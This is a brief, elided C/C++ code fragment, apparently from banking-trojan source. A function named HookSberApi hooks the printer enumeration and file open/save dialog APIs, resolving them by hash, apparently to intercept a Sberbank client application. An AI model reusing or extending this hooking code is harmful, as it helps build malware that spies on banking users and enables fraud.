...
bool HookSberApi()
{
	...
	TranslateHook( hLib, pInitFunc, "EnumPrintersACallBack", "EnumPrintersA", WINSPOOL_DRV, 0x9804C3C0, Real_EnumPrintersA );
	TranslateHook( hLib, pInitFunc, "GetSaveFileNameACallBack", "GetSaveFileNameA", COMANDLG32_DLL, 0x8FD473C8, Real_GetSaveFileNameA );
	TranslateHook( hLib, pInitFunc, "GetOpenFileNameACallBack", "GetOpenFileNameA", COMANDLG32_DLL, 0xE16570D, Real_GetOpenFileNameA );
